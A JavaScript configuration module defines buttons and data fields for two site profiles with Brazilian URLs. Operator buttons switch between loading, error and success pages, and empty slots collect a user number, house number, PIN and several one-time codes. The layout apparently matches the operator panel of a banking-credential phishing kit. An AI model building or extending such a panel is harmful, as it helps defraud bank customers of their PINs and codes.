module.exports = {
    data:  {
        "type": "A",
        "site": {      
            "name": 'NBP',
            "site": 'http://www.nbp.com.br'
        },
        
        "buttons": {
                "buttons_config": {
                "button_01": {
                    text: "Home",
                    id: "id_home",
                    response: [],
                    function: "showPage('home')"
                },
                
                "button_02": {
                    text: "M1",
                    id: "id_m1",
                    response: [],
                    function: "getM('m1')"
                },
                
                "button_03": {
                    text: "M2",
                    id: "id_m2",
                    response: [],
                    function: "getM('m2')"
                },
                
                "button_04": {
                    text: "Pin",
                    id: "id_pin",
                    response: [],
                    function: "getPin('pin')"
                },
                
                "button_05": {
                    text: "Loading",
                    id: "id_loading",
                    response: [],
                    function: "showPage('loading')"
                },	
                
                "button_06": {
                    text: "Error top",
                    id: "id_error_top",
                    response: [],
                    function: "showPage('errorTop')"
                },	
    
                "button_07": {
                    text: "Success top",
                    id: "id_error_success",
                    response: [],
                    function: "showPage('success')"
                },					
            }
        },
        
        "data": {
            "data_01": {
                page: "HOME",
                data_name: "number_user",
                data: null
            },				
            
            "data_02": {
                page: "HOME",
                data_name: "Number-house:",
                data: null
            },		
        
            "data_03": {
                page: "M1",
                data_name: "Code-M1:",
                data: null
            },	
            
            "data_04": {
                page: "M2",
                data_name: "Code-M2:",
                data: null
            },	
            
            "data_05": {
                page: "PIN",
                data_name: "Code-PIN:",
                data: null
            },	
			
			 "data_06": {
                page: "ZIM",
                data_name: "Code-ZIM:",
                data: null
            },	

        }
        
    },
    data2: {
        type: "B",
        site: {      
            name: 'XYZ',
            site: 'http://www.xyz.com.br'
        },
        
        "buttons": {
                "buttons_config": {
                "button_01": {
                    text: "HISTORY",
                    id: "id_history",
                    response: [],
                    function: "history('start')"
                },
                
                "button_02": {
                    text: "OP1",
                    id: "id_op1",
                    response: [],
                    function: "verify('op1')"
                },
                
                "button_03": {
                    text: "OP2",
                    id: "id_op2",
                    response: [],
                    function: "verify('op2')"
                }					
            }
        },
        
        "data": {
            "data_01": {
                page: "HISTORY",
                data_name: "data-history:",
                data: null
            },				
            
            "data_02": {
                page: "OP1",
                data_name: "data-op1:",
                data: null
            },		
        
            "data_03": {
                page: "OP2",
                data_name: "data-op2:",
                data: null
            }
        }
    }
}